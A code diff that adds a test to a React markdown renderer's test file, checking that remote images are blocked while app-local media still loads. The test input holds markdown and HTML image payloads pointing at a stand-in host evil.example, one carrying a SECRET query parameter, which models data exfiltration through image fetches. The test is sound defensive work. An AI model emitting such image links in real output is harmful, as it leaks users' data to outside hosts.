@@ -4,6 +4,7 @@ import userEvent from '@testing-library/user-event'
 import Markdown from './MarkdownRenderer'
 import { stubAnimate } from '../../../test/animate'
 import { LinkCheckContext, type LinkCheck } from './LinkCheckContext'
+import { appUrl } from '../../../lib/appRoot'
 
 afterEach(() => { cleanup(); vi.restoreAllMocks() })
 
@@ -69,6 +70,15 @@ describe('external link confirmation (TAL-279)', () => {
       vi.useRealTimers()
     }
     expect(open).not.toHaveBeenCalled()
+  })
+})
+
+describe('remote images (TAL-2199)', () => {
+  it('never loads a remote image handed to it directly, and keeps app media', async () => {
+    render(<Markdown text={'![leak](https://evil.example/p.png?d=SECRET) ![proto](//evil.example/q.png) ![local](./api/media?path=%2Ftmp%2Fa.png)\n\n<img src="https://evil.example/r.png" alt="raw">'} />)
+    await screen.findByRole('img', { name: 'local' })
+    expect([...document.querySelectorAll('img')].map((img) => img.getAttribute('src'))).toEqual([appUrl('api/media?path=%2Ftmp%2Fa.png').href])
+    expect(document.body.innerHTML).not.toContain('evil.example')
   })
 })
 
